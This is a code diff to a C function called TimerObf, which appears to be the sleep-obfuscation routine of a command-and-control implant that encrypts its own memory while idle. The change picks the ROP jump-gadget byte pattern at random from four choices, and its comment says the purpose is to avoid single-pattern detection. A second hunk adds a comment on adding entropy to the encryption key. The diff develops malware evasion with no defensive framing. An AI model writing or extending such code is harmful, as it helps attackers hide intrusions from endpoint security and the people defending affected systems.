@@ -370,7 +370,14 @@ BOOL TimerObf(
     ULONG    Protect   = { 0 };
     BYTE     JmpBypass = { 0 };
     PVOID    JmpGadget = { 0 };
-    BYTE     JmpPad[]  = { 0xFF, 0xE0 };
+    /* Multiple ROP gadget patterns to avoid single-pattern detection:
+     * 0xFF 0xE0 = jmp rax, 0xFF 0xE1 = jmp rcx, 0xFF 0xE2 = jmp rdx
+     * Pattern selection is randomized per execution */
+    BYTE     JmpPatterns[][2] = { { 0xFF, 0xE0 }, { 0xFF, 0xE1 }, { 0xFF, 0xE2 }, { 0xFF, 0xE3 } };
+    DWORD    PatternIdx = RandomNumber32() % 4;
+    BYTE     JmpPad[2];
+    JmpPad[0] = JmpPatterns[PatternIdx][0];
+    JmpPad[1] = JmpPatterns[PatternIdx][1];
 
     ImageBase = TxtBase = Instance->Session.ModuleBase;
     ImageSize = TxtSize = Instance->Session.ModuleSize;
@@ -383,7 +390,8 @@ BOOL TimerObf(
         Protect = PAGE_EXECUTE_READ;
     }
 
-    /* create a random key */
+    /* create a random key - consider mixing additional entropy sources
+     * (CPU timing, page faults, cache timing) for improved randomness */
     for ( BYTE i = 0; i < 16; i++ ) {
         Buf[ i ] = RandomNumber32( );
     }
